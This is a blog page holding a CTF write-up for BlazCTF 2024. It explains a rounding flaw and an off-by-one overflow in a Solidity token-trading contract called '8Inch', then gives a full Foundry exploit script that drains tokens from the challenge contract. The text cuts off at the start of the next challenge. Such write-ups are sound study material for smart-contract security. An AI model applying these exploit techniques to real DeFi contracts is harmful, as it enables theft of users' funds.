<!DOCTYPE html>
<html lang="en-us" dir="ltr" data-bs-theme="dark">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>BlazCTF 2024 Writeup | Mystify</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&family=Libre+Baskerville:ital,wght@0,400..700;1,400..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/css/bootstrap.min.css"
  integrity="sha512-2bBQCjcnw658Lho4nlXJcc6WkV/UxpE/sAokbXPxQNGqmNdQrWqtw26Ns9kFF/yG792pKR1Sx8/Y1Lf1XN4GKA==" crossorigin="anonymous"
  referrerpolicy="no-referrer" />
<link rel="stylesheet" href="/css/main.min.e0d3493d996b65055f87a93e94627d58325b4f40eae7e97eed960541aab132ca.css" integrity="sha256-4NNJPZlrZQVfh6k&#43;lGJ9WDJbT0Dq5&#43;l&#43;7ZYFQaqxMso=" crossorigin="anonymous">
<link rel="stylesheet" href="/css/prism.min.ebb6c0bd3fe6ed4e16ec09f3b52903ee18ddfb21e33b6882030d951a91b213e4.css" integrity="sha256-67bAvT/m7U4W7AnztSkD7hjd&#43;yHjO2iCAw2VGpGyE&#43;Q=" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/js/bootstrap.min.js"
  integrity="sha512-nKXmKvJyiGQy343jatQlzDprflyB5c+tKCzGP3Uq67v+lmzfnZUi/ZT+fc6ITZfSC5HhaBKUIvr/nTLCV+7F+Q==" crossorigin="anonymous"
  referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
  integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous"
  referrerpolicy="no-referrer"></script>
        <script src="/js/main.f2979a93a325fecf9605263bd141398a311c8e23388ed7dcff74f92f7e632866.js" integrity="sha256-8peak6Ml/s&#43;WBSY70UE5ijEcjiM4jtfc/3T5L35jKGY=" crossorigin="anonymous"></script>
        <script src="/js/prism.0ecb34b0181efd0f9aa6d1a8fc2e4814ffbdd9acc78d93d02a94e01f64f87f35.js" integrity="sha256-Dss0sBge/Q&#43;aptGo/C5IFP&#43;92azHjZPQKpTgH2T4fzU=" crossorigin="anonymous"></script>



</head>
<body class="overflow-y-scroll">
  <nav class="navbar navbar-expand-lg sticky-top bg-body-tertiary">
  <div class="container">
    <a class="navbar-brand" href="/">Mystify</a>

    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
      <div class="navbar-nav">
        
        
          <a class="nav-link " href="/about-me/">
            About Me 
          </a>
        
          <a class="nav-link " href="/blogroll/">
            Blogroll 
          </a>
        
          <a class="nav-link " href="/crypto-in-ctf/">
            Crypto in CTF 
          </a>
        
      </div>
    </div>
  </div>
</nav>

  <main>
    <div class="container mt-3">
      
  <div class="row justify-content-center">
    <div class="col-12 col-xl-8">
      <h1 class="post-title">BlazCTF 2024 Writeup</h1>

      
      <div class="text-muted pb-4">
        
          
          
          <time datetime="2024-09-28T01:30:00&#43;08:00">2024-09-28</time>
        
        
        <span class="px-1">::</span>
        
        
          <span class="badge rounded-pill bg-secondary">
            <a href="https://mystiz.hk/tags/ctf/" class="text-muted text-decoration-none">#ctf</a>
          </span>
        
          <span class="badge rounded-pill bg-secondary">
            <a href="https://mystiz.hk/tags/blazctf/" class="text-muted text-decoration-none">#blazctf</a>
          </span>
        
          <span class="badge rounded-pill bg-secondary">
            <a href="https://mystiz.hk/tags/blockchain/" class="text-muted text-decoration-none">#blockchain</a>
          </span>
        
      </div>
      

      <div class="post-content js-toc-content"><div>
          <p>This time I went to <a href="https://twitter.com/DeFiHackLabs" target="_blank" rel="nofollow">@DeFiHackLabs</a> and attempt my very first Web3-focused CTF. I am fortunately able to solve some challenges. Nothing particular difficult, but that's still something.</p>
<div class="alert danger">
  ðŸš§ <strong>Syntax highlight to be fixed.</strong> I never imagine that I will work on Web3 challenges, thus I did not have syntax highlight for Solidity. I will have this addressed.
</div>

<h2 id="8inch">8Inch<a href="#8inch" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<blockquote>
<p>After finding out CowSwap raising millions, Tony reluctantly coded an intent-based DeFi project, wrestling with his ideals as venture capital poured in.</p>
<p><a href="https://storage.googleapis.com/blazctf24/8inch.zip"
   
   target="_blank" rel="noopener noreferrer" >Handouts</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
</svg></p>
</blockquote>
<p>The <code>TradeSettlement</code> contract has given us some functions to trade ERC20 tokens with others. The deployer account is selling 10 WOJAK with 1 WETH on <code>TradeSettlement</code> at the beginning. The goal is to obtain at least 10 WOJAK.</p>
<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h4 id="part-i-stealing-tokens-from-the-deployers-trade">Part I: Stealing tokens from the deployer's trade<a href="#part-i-stealing-tokens-from-the-deployers-trade" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><code>TradeSettlement::settleTrade</code> allows us to partially fill a trade using token A for token B. The token transfers are defined in the below lines:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="nb">require</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">trade</span><span class="p">.</span><span class="n">tokenToBuy</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">trade</span><span class="p">.</span><span class="n">maker</span><span class="p">,</span> <span class="n">tradeAmount</span> <span class="o">/</span> <span class="n">trade</span><span class="p">.</span><span class="n">amountToSell</span><span class="p">),</span> <span class="s">&#34;Buy transfer failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nb">require</span><span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">trade</span><span class="p">.</span><span class="n">tokenToSell</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">_amountToSettle</span><span class="p">),</span> <span class="s">&#34;Sell transfer failed&#34;</span><span class="p">);</span>
</span></span></code></pre></div><p>When <code>tradeAmount &lt; trade.amountToSell</code>, we will be sending no tokens in order to gain some token B. From the existing trade where one is selling 10 WOJAK for 1 WETH, we are able to buy $9 \cdot 10^{-18}$ WOJAK for free.</p>


<figure>
  <img src="/images/2024-09-28-blazctf/8inch-progress-1.png" title="Progress: $9 \cdot 10^{-18} / 10$.">
  
  <figcaption>Progress: $9 \cdot 10^{-18} / 10$.</figcaption>
  
</figure>

<p>We can repeat this vulnerability as much as possible. Maybe let's exploit it four times to give us... $45 \cdot 10^{-18}$ WOJAK? We are having a good start!</p>


<figure>
  <img src="/images/2024-09-28-blazctf/8inch-progress-1.png" title="Progress: $45 \cdot 10^{-18} / 10$.">
  
  <figcaption>Progress: $45 \cdot 10^{-18} / 10$.</figcaption>
  
</figure>

<h4 id="part-ii-exploiting-integer-overflow-in-safeuint112">Part II: Exploiting integer overflow in <code>SafeUint112</code><a href="#part-ii-exploiting-integer-overflow-in-safeuint112" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p><code>SafeUint112::safeCast</code> and <code>SafeUint112::safeMul</code>, contrary to their names, are not safe. For instance, <code>safeCast</code> intends to cast a <code>uint256</code> that fits into a <code>uint112</code>. However, it mistakenly includes $2^{112}$ as a valid input and allow it to be casted into <code>uint112(0)</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">SafeUint112</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">/// @dev safeCast is a function that converts a uint256 to a uint112, and reverts on overflow
</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">safeCast</span><span class="p">(</span><span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint112</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">value</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">112</span><span class="p">),</span> <span class="s">&#34;SafeUint112: value exceeds uint112 max&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">uint112</span><span class="p">(</span><span class="nb">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">/// @dev safeMul is a function that multiplies two uint112 values, and reverts on overflow
</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">safeMul</span><span class="p">(</span><span class="kt">uint112</span> <span class="n">a</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">b</span><span class="p">)</span> <span class="k">internal</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint112</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">b</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">112</span><span class="p">),</span> <span class="s">&#34;SafeUint112: value exceeds uint112 max&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kt">uint112</span><span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><code>safeCast</code> is used in multiple places like <code>TradeSettlement::scaleTrade</code>, which made the function vulnerable. In particular, we can overflow <code>newAmountNeededWithFee</code> and make it zero. Thus we can scale up the trade without sending more tokens.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">TradeSettlement</span> <span class="k">is</span> <span class="n">SafeUint112</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">scaleTrade</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_tradeId</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">scale</span><span class="p">)</span> <span class="k">external</span> <span class="n">nonReentrant</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">trades</span><span class="p">[</span><span class="n">_tradeId</span><span class="p">].</span><span class="n">maker</span><span class="p">,</span> <span class="s">&#34;Only maker can scale&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Trade</span> <span class="k">storage</span> <span class="n">trade</span> <span class="o">=</span> <span class="n">trades</span><span class="p">[</span><span class="n">_tradeId</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">trade</span><span class="p">.</span><span class="n">isActive</span><span class="p">,</span> <span class="s">&#34;Trade is not active&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">scale</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Invalid scale&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">trade</span><span class="p">.</span><span class="n">filledAmountToBuy</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;Trade is already filled&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint112</span> <span class="n">originalAmountToSell</span> <span class="o">=</span> <span class="n">trade</span><span class="p">.</span><span class="n">amountToSell</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">trade</span><span class="p">.</span><span class="n">amountToSell</span> <span class="o">=</span> <span class="n">safeCast</span><span class="p">(</span><span class="n">safeMul</span><span class="p">(</span><span class="n">trade</span><span class="p">.</span><span class="n">amountToSell</span><span class="p">,</span> <span class="n">scale</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">trade</span><span class="p">.</span><span class="n">amountToBuy</span> <span class="o">=</span> <span class="n">safeCast</span><span class="p">(</span><span class="n">safeMul</span><span class="p">(</span><span class="n">trade</span><span class="p">.</span><span class="n">amountToBuy</span><span class="p">,</span> <span class="n">scale</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">newAmountNeededWithFee</span> <span class="o">=</span> <span class="n">safeCast</span><span class="p">(</span><span class="n">safeMul</span><span class="p">(</span><span class="n">originalAmountToSell</span><span class="p">,</span> <span class="n">scale</span><span class="p">)</span> <span class="o">+</span> <span class="n">fee</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">originalAmountToSell</span> <span class="o">&lt;</span> <span class="n">newAmountNeededWithFee</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="n">IERC20</span><span class="p">(</span><span class="n">trade</span><span class="p">.</span><span class="n">tokenToSell</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">newAmountNeededWithFee</span> <span class="o">-</span> <span class="n">originalAmountToSell</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">                <span class="s">&#34;Transfer failed&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>We can create the trade on the left using <code>TradeSettlement::createTrade</code> to exploit the overflowing vulnerability. By scaling the above trade <code>2**111 - 15</code> times, we have <code>newAmountNeededWithFee = 0</code>. Therefore we are able to scale up the trade without paying additional tokens.</p>
<div class="text-center pb-3">
  <div class="graphviz">
  digraph {
    graph [bgcolor="transparent"]
    node [color="#ffe4e1", fontcolor="#ffe4e1", fillcolor="#33333c", style="filled"]
    edge [color="#ffe4e1", fontcolor="#ffe4e1"]

    
  rankdir=LR

  &amp;#34;trade-1&amp;#34;[shape=box, fontname=&amp;#34;Fira Code&amp;#34;, label=&amp;lt;&amp;lt;font point-size=&amp;#34;11&amp;#34;&amp;gt;
        maker = address(PLAYER)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        taker = address(0x0)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        tokenToSell = address(WOJAK)&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        tokenToBuy = address(WOJAK)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        amountToSell = 2&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        amountToBuy = 1&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;&amp;lt;/font&amp;gt;&amp;gt;, width=3.5]
  &amp;#34;trade-2&amp;#34;[shape=box, fontname=&amp;#34;Fira Code&amp;#34;, label=&amp;lt;&amp;lt;font point-size=&amp;#34;11&amp;#34;&amp;gt;
        maker = address(PLAYER)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        taker = address(0x0)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        tokenToSell = address(WOJAK)&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        tokenToBuy = address(WOJAK)&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        amountToSell = 2**112 - 30&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;
        amountToBuy = 2**111 - 15&amp;lt;BR align=&amp;#34;left&amp;#34; /&amp;gt;&amp;lt;/font&amp;gt;&amp;gt;, width=3.5]

  &amp;#34;trade-1&amp;#34; -&amp;gt; &amp;#34;trade-2&amp;#34;[label=&amp;#34;Scaled&amp;#34;]

  }
  </div>
</div>

<p>Using <code>TradeSettlement::settleTrade</code>, we can buy 2 WOJAK from the scaled trade at the price of 1 WOJAK. As long as there are sufficient balance in the settlement, we are able to triple our WOJAK settling the scaled trade.</p>
<div class="text-center pb-3">
  <div class="graphviz">
  digraph {
    graph [bgcolor="transparent"]
    node [color="#ffe4e1", fontcolor="#ffe4e1", fillcolor="#33333c", style="filled"]
    edge [color="#ffe4e1", fontcolor="#ffe4e1"]

    
  rankdir=LR
  node[shape=box]

  &amp;#34;player&amp;#34; -&amp;gt; &amp;#34;player&amp;#34;[label=&amp;#34;1 WOJAK&amp;#34;]
  &amp;#34;settlement&amp;#34; -&amp;gt; &amp;#34;player&amp;#34;[label=&amp;#34;2 WOJAK&amp;#34;]

  }
  </div>
</div>

<p>To sum up, we can pay a portion of our hard-earned $45 \cdot 10^{-18}$ WOJAK to create a trade. By scaling it up and repeatedly buying from the scaled trade, we can earn 10 WOJAK.</p>


<figure>
  <img src="/images/2024-09-28-blazctf/8inch-progress-2.png" title="Progress: $10 / 10$.">
  
  <figcaption>Progress: $10 / 10$.</figcaption>
  
</figure>

<h3 id="solution-script">Solution Script<a href="#solution-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">26</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Challenge</span><span class="p">,</span> <span class="n">TradeSettlement</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/8Inch.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../src/ERC20.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ExploitScript</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">Challenge</span> <span class="n">challenge</span> <span class="o">=</span> <span class="n">Challenge</span><span class="p">(</span><span class="mh">0x368F8017A2b3Af3416977ba4EB8DD21d60A2538E</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">TradeSettlement</span> <span class="n">tradeSettlement</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">.</span><span class="n">tradeSettlement</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">SimpleERC20</span> <span class="n">wojak</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">.</span><span class="n">wojak</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">player</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">tradeSettlement</span><span class="p">.</span><span class="n">settleTrade</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">9</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">==</span> <span class="mi">45</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">wojak</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">tradeSettlement</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">tradeSettlement</span><span class="p">.</span><span class="n">createTrade</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">wojak</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">wojak</span><span class="p">),</span> <span class="mi">2</span><span class="o">+</span><span class="mi">30</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">==</span> <span class="mi">13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">tradeSettlement</span><span class="p">.</span><span class="n">scaleTrade</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2596148429267413814265248164610033</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">==</span> <span class="mi">13</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">tradeSettlement</span><span class="p">.</span><span class="n">settleTrade</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">27</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">==</span> <span class="mi">40</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">currentBalance</span> <span class="o">=</span> <span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">tradeSettlement</span><span class="p">.</span><span class="n">settleTrade</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="o">*</span><span class="n">currentBalance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">==</span> <span class="mi">3</span><span class="o">*</span><span class="n">currentBalance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">==</span> <span class="mi">6003785411879964840</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">tradeSettlement</span><span class="p">.</span><span class="n">settleTrade</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span> <span class="kc">ether</span> <span class="o">-</span> <span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">==</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">wojak</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xc0ffee</span><span class="p">),</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">wojak</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xc0ffee</span><span class="p">))</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="kc">ether</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">challenge</span><span class="p">.</span><span class="n">isSolved</span><span class="p">(),</span> <span class="s">&#34;not solved&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="doju">Doju<a href="#doju" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="challenge-summary-1">Challenge Summary<a href="#challenge-summary-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<blockquote>
<p>Pump.Fun? No cult Solana sorry. Tony only builds on Ethereum. Here is his state-of-the-art gas-efficient bonding curve token.</p>
<p><a href="https://storage.googleapis.com/blazctf24/doju.zip"
   
   target="_blank" rel="noopener noreferrer" >Handouts</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
